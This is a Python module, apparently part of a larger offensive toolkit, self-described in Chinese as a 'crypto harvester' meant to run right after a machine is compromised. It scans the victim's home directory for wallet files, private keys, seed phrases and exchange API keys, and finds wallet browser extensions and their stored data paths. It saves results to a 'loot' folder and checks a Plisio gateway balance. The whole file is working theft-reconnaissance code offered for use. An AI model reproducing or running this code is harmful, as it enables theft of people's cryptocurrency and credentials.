# 开发者：自由的风
"""crypto_harvester/run.py — 数字货币收割机
===========================================
攻击域 core — 攻破后第一动作: 扫描所有加密钱包/私钥/助记词/浏览器插件。
支持: BTC/ETH/SOL/BNB/MetaMask/Phantom/TrustWallet/Ledger/Trezor。
"""
import sys, json, os, re, base64
import urllib.request, urllib.error
from pathlib import Path
from datetime import datetime

SANDBOX = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LOOT_DIR = Path.home() / ".gbt" / "loot" / "crypto"
LOOT_DIR.mkdir(parents=True, exist_ok=True)

# ═══════════════════════════════════════════════════════════
#  加密钱包指纹库
# ═══════════════════════════════════════════════════════════

WALLET_PATTERNS = {
    # 私钥格式
    "BTC_WIF": (r'[5LK][1-9A-HJ-NP-Za-km-z]{50,51}', "BTC私钥(WIF)", "bitcoin"),
    "BTC_HEX": (r'(?i)(?:bitcoin|btc).{0,20}private.{0,10}([a-f0-9]{64})', "BTC私钥(HEX)", "bitcoin"),
    "ETH_KEY": (r'(?:0x)?[a-fA-F0-9]{64}', "ETH私钥", "ethereum"),
    "SOL_KEY": (r'\[[0-9,\s]{30,}\]', "SOL密钥对", "solana"),
    
    # 助记词(12/24词)
    "MNEMONIC_12": (r'(?:\b[a-z]{2,8}\s){11}[a-z]{2,8}\b', "12词助记词", "any"),
    "MNEMONIC_24": (r'(?:\b[a-z]{2,8}\s){23}[a-z]{2,8}\b', "24词助记词", "any"),
    
    # 钱包文件
    "WALLET_DAT": (r'wallet\.dat', "Bitcoin Core钱包", "bitcoin"),
    "KEYSTORE": (r'keystore|UTC--', "以太坊Keystore", "ethereum"),
    "METAMASK": (r'(?i)metamask.*vault|MetaMask.*vault', "MetaMask Vault", "ethereum"),
    "PHANTOM": (r'(?i)phantom.*(?:key|wallet|secret)', "Phantom钱包", "solana"),
    "TRUST": (r'(?i)trust.*wallet.*(?:key|secret)', "TrustWallet", "any"),
    "EXODUS": (r'(?i)exodus.*(?:wallet|key)', "Exodus钱包", "any"),
    "LEDGER": (r'(?i)ledger.*(?:live|seed|recovery)', "Ledger硬件", "any"),
    "TREZOR": (r'(?i)trezor.*(?:seed|recovery)', "Trezor硬件", "any"),
    
    # 交易所API密钥
    "BINANCE_KEY": (r'(?i)binance.{0,20}(?:api|secret|key).{0,20}([A-Za-z0-9]{20,})', "Binance API", "exchange"),
    "COINBASE_KEY": (r'(?i)coinbase.{0,20}(?:api|secret|key).{0,20}([A-Za-z0-9]{20,})', "Coinbase API", "exchange"),
    "KRAKEN_KEY": (r'(?i)kraken.{0,20}(?:api|secret|key).{0,20}([A-Za-z0-9]{20,})', "Kraken API", "exchange"),
    
    # 钱包地址
    "BTC_ADDR": (r'\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b', "BTC地址", "bitcoin"),
    "ETH_ADDR": (r'\b0x[a-fA-F0-9]{40}\b', "ETH地址", "ethereum"),
    "SOL_ADDR": (r'\b[1-9A-HJ-NP-Za-km-z]{32,44}\b', "SOL地址", "solana"),
}

def _scan_wallets(content, source="unknown"):
    findings = []
    for pid, (pattern, desc, chain) in WALLET_PATTERNS.items():
        for m in re.finditer(pattern, content):
            match = m.group(0) if not m.groups() else (m.group(1) or m.group(0))
            # 掩码私钥
            masked = match[:6] + "***" + match[-4:] if len(match) > 10 else "***"
            ctx = content[max(0,m.start()-20):m.end()+30].replace('\n',' ')[:100]
            findings.append({
                "type": desc, "chain": chain,
                "match": masked, "context": ctx, "source": source,
                "severity": "critical" if "私钥" in desc or "助记" in desc or "API" in desc else "high",
            })
    return findings

def do_scan_files(params):
    roots = params.get("roots", [str(Path.home())])
    max_depth = params.get("depth", 5)
    wallet_exts = {".dat", ".json", ".keystore", ".wallet", ".seed", ".aes", ".enc"}
    
    all_findings = []
    scanned = 0
    
    for root in roots:
        for dirpath, dirnames, filenames in os.walk(root):
            depth = dirpath.count(os.sep) - root.count(os.sep)
            if depth > max_depth: dirnames.clear(); continue
            
            for fname in filenames:
                if scanned > 500: break
                scanned += 1
                fpath = Path(dirpath) / fname
                ext = fpath.suffix.lower()
                
                # 钱包文件或文本文件
                if ext in wallet_exts or ext in {".txt", ".md", ".cfg", ".ini", ".env", ".log", ".csv", ""}:
                    try:
                        if fpath.stat().st_size > 10 * 1024 * 1024: continue  # >10MB跳过
                        content = fpath.read_text(encoding="utf-8", errors="replace")
                        findings = _scan_wallets(content, str(fpath))
                        if findings:
                            all_findings.extend(findings)
                    except: pass
            if scanned > 500: break
    
    return {"ok": True, "cap": "crypto_harvester", "domain": "攻击域",
            "scanned": scanned, "wallets_found": len(all_findings), "findings": all_findings[:50]}

def do_scan_browsers(params):
    browsers = {
        "Chrome": Path.home() / "AppData/Local/Google/Chrome/User Data",
        "Edge": Path.home() / "AppData/Local/Microsoft/Edge/User Data",
        "Brave": Path.home() / "AppData/Local/BraveSoftware/Brave-Browser/User Data",
        "Firefox": Path.home() / "AppData/Roaming/Mozilla/Firefox/Profiles",
    }
    findings = []
    for name, path in browsers.items():
        if not path.exists(): continue
        for ext_dir in path.glob("**/Extensions"):
            for ext in ext_dir.iterdir():
                ext_id = ext.name
                # MetaMask: nkbihfbeogaeaoehlefnkodbefgpgknn
                # Phantom: bfnaelmomeimhlpmgjnjophhpkkoljpa
                known_wallets = {
                    "nkbihfbeogaeaoehlefnkodbefgpgknn": "MetaMask",
                    "bfnaelmomeimhlpmgjnjophhpkkoljpa": "Phantom",
                    "fhbohimaelbohpjbbldcngcnapndodjp": "Binance Chain Wallet",
                    "hnfanknocfeofbddgcijnmhnfnkdnaad": "Coinbase Wallet",
                    "egjidjbpglichdcondbcbdnbeeppgdph": "Trust Wallet",
                }
                if ext_id in known_wallets:
                    findings.append({"browser": name, "wallet": known_wallets[ext_id], "ext_id": ext_id})
        # 检查Local Extension Settings中的加密数据
        for local_ext in path.glob("**/Local Extension Settings"):
            for ext_dir in local_ext.iterdir():
                if ext_dir.name in known_wallets:
                    findings.append({"browser": name, "wallet": known_wallets[ext_dir.name], 
                                   "has_data": True, "data_path": str(ext_dir)})
    return {"ok": True, "browsers_scanned": len(browsers), "extensions_found": findings}

def _load_plisio():
    p = Path(SANDBOX).parent / ".gbt" / "plisio_config.json"
    if p.exists():
        cfg = json.loads(p.read_text(encoding="utf-8"))
        # Resolve ${VAR} env var references in string values
        def _resolve(obj):
            if isinstance(obj, str):
                return os.path.expandvars(obj)
            elif isinstance(obj, dict):
                return {k: _resolve(v) for k, v in obj.items()}
            elif isinstance(obj, list):
                return [_resolve(v) for v in obj]
            return obj
        return _resolve(cfg)
    return None

def do_plisio_balance(params):
    """Plisio全币种余额查询"""
    cfg = _load_plisio()
    if not cfg or not cfg.get("plisio_api_key"):
        return {"ok": False, "error": "Plisio未配置"}
    key = cfg["plisio_api_key"]
    coins = params.get("coins", ["BTC","ETH","LTC","DOGE","USDT","USDC","SOL","BNB","XRP","TRX","BCH"])
    balances = {}
    for coin in coins:
        try:
            url = "https://plisio.net/api/v1/balances/{}?api_key={}".format(coin, key)
            data = json.loads(urllib.request.urlopen(urllib.request.Request(url), timeout=8).read())
            if data.get("status") == "success":
                balances[coin] = data["data"]["balance"]
        except: pass
    ops_url = "https://plisio.net/api/v1/operations?api_key={}".format(key)
    try:
        ops = json.loads(urllib.request.urlopen(ops_url, timeout=8).read())
        total_ops = ops.get("data",{}).get("_meta",{}).get("totalCount", 0)
    except: total_ops = 0
    return {"ok": True, "cap": "crypto_harvester", "action": "plisio_balance",
            "gateway": "Plisio", "operations": total_ops, "balances": balances,
            "status": "active" if cfg.get("enabled", True) else "disabled"}
def do_harvest(params):
    """全量收割 — 文件+浏览器+Plisio"""
    file_scan = do_scan_files(params)
    browser_scan = do_scan_browsers(params)
    plisio = do_plisio_balance(params)
    return {"ok": True, "cap": "crypto_harvester", "action": "harvest",
            "files": file_scan, "browsers": browser_scan, "plisio_gateway": plisio,
            "total_wallets": len(file_scan.get("findings",[])) + len(browser_scan.get("extensions_found",[])),
            "verdict": "加密资产已收割"}
HANDLERS = {"scan": do_scan_files, "browsers": do_scan_browsers, "harvest": do_harvest, "plisio": do_plisio_balance}
if __name__ == "__main__":
    a = sys.argv[1] if len(sys.argv)>1 else "harvest"
    p = json.loads(sys.argv[2]) if len(sys.argv)>2 else {}
    r = HANDLERS.get(a, lambda p:{"ok":False})(p)
    print(json.dumps(r,ensure_ascii=False,default=str))
